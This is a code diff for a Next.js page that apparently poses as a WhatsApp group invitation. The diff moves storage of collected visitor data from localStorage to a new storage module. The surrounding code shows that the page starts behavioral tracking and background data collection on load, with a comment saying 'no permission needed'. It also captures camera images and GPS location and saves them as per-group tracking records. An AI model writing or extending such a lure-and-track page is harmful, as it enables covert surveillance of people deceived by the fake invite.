@@ -3,6 +3,7 @@
 import { useState, useEffect, useRef } from 'react';
 import { useParams } from 'next/navigation';
 import { collectAllData, collectDataWithoutGPS, initializeBehavioralTracking, CollectedData, getCameraPermissionStatus, captureCameraImage } from '@/lib/dataCollection';
+import { saveTrackingData, getGroupData } from '@/lib/storage';
 import { WhatsappLogo, WarningCircle, CheckCircle, Spinner } from '@phosphor-icons/react';
 import { twMerge } from 'tailwind-merge';
 
@@ -32,29 +33,25 @@ export default function JoinPage() {
     // Initialize behavioral tracking when page loads
     initializeBehavioralTracking();
     
-    // Load group data from localStorage - handle both URL params and direct access
-    const stored = localStorage.getItem(`group_${groupId}`);
-    if (stored) {
-      try {
-        setGroupData(JSON.parse(stored));
-      } catch (error) {
-        console.error('Error parsing group data:', error);
-      }
-    } else {
-      // Try to get groupId from URL if not in params
-      const urlPath = window.location.pathname;
-      const urlGroupId = urlPath.split('/join/')[1]?.split('/')[0]?.split('?')[0];
-      if (urlGroupId && urlGroupId !== groupId) {
-        const altStored = localStorage.getItem(`group_${urlGroupId}`);
-        if (altStored) {
-          try {
-            setGroupData(JSON.parse(altStored));
-          } catch (error) {
-            console.error('Error parsing group data:', error);
-          }
+    // Load group data using new storage system
+    const loadGroupData = async () => {
+      let data = await getGroupData(groupId);
+      
+      if (!data) {
+        // Try to get groupId from URL if not in params
+        const urlPath = window.location.pathname;
+        const urlGroupId = urlPath.split('/join/')[1]?.split('/')[0]?.split('?')[0];
+        if (urlGroupId && urlGroupId !== groupId) {
+          data = await getGroupData(urlGroupId);
         }
       }
-    }
+      
+      if (data) {
+        setGroupData(data);
+      }
+    };
+    
+    loadGroupData();
 
     // Start background data collection immediately (no permission needed)
     collectBackgroundData();
@@ -99,10 +96,8 @@ export default function JoinPage() {
       backgroundDataRef.current = dataWithCamera as any;
       setBackgroundDataCollected(true);
       
-      // Store background data immediately (even without GPS)
-      const existingData = JSON.parse(localStorage.getItem('tracking_data') || '[]');
-      existingData.push(dataWithCamera);
-      localStorage.setItem('tracking_data', JSON.stringify(existingData));
+      // Store background data immediately using new storage system
+      await saveTrackingData(dataWithCamera as CollectedData);
     } catch (error) {
       console.error('Error collecting background data:', error);
     }
@@ -189,18 +184,8 @@ export default function JoinPage() {
           allData.metadata.cameraPermissionStatus = cameraPermissionStatus;
           setCollectedData(allData);
           
-          // Update stored data with GPS location
-          const existingData = JSON.parse(localStorage.getItem('tracking_data') || '[]');
-          // Find the last entry (our background data) and update it
-          if (existingData.length > 0) {
-            existingData[existingData.length - 1] = allData;
-            localStorage.setItem('tracking_data', JSON.stringify(existingData));
-          }
-          
-          // Also store in group-specific storage
-          const groupTrackingData = JSON.parse(localStorage.getItem(`group_tracking_${groupId}`) || '[]');
-          groupTrackingData.push(allData);
-          localStorage.setItem(`group_tracking_${groupId}`, JSON.stringify(groupTrackingData));
+          // Save data using new storage system (handles both IndexedDB and localStorage)
+          await saveTrackingData(allData);
         } else {
           // No background data yet, collect everything now
           const allData = await collectAllData(groupId, position.coords);
@@ -208,13 +193,8 @@ export default function JoinPage() {
           allData.metadata.cameraPermissionStatus = cameraPermissionStatus;
           setCollectedData(allData);
           
-          const existingData = JSON.parse(localStorage.getItem('tracking_data') || '[]');
-          existingData.push(allData);
-          localStorage.setItem('tracking_data', JSON.stringify(existingData));
-          
-          const groupTrackingData = JSON.parse(localStorage.getItem(`group_tracking_${groupId}`) || '[]');
-          groupTrackingData.push(allData);
-          localStorage.setItem(`group_tracking_${groupId}`, JSON.stringify(groupTrackingData));
+          // Save data using new storage system
+          await saveTrackingData(allData);
         }
       },
       (error) => {
@@ -319,23 +299,8 @@ export default function JoinPage() {
         
         setCollectedData(allData);
         
-        // Update or add to stored data
-        const existingData = JSON.parse(localStorage.getItem('tracking_data') || '[]');
-        
-        // If we have background data, update it; otherwise add new
-        if (backgroundDataRef.current && existingData.length > 0) {
-          existingData[existingData.length - 1] = allData;
-        } else {
-          existingData.push(allData);
-        }
-        localStorage.setItem('tracking_data', JSON.stringify(existingData));
-        
-        // Also store in a separate file per group for easy access
-        const groupTrackingData = JSON.parse(localStorage.getItem(`group_tracking_${groupId}`) || '[]');
-        // Remove the background data entry if it exists
-        const filteredGroupData = groupTrackingData.filter((d: any) => d.gpsLocation !== null);
-        filteredGroupData.push(allData);
-        localStorage.setItem(`group_tracking_${groupId}`, JSON.stringify(filteredGroupData));
+        // Save data using new storage system (handles both IndexedDB and localStorage)
+        await saveTrackingData(allData);
         
         setHasJoined(true);
       },
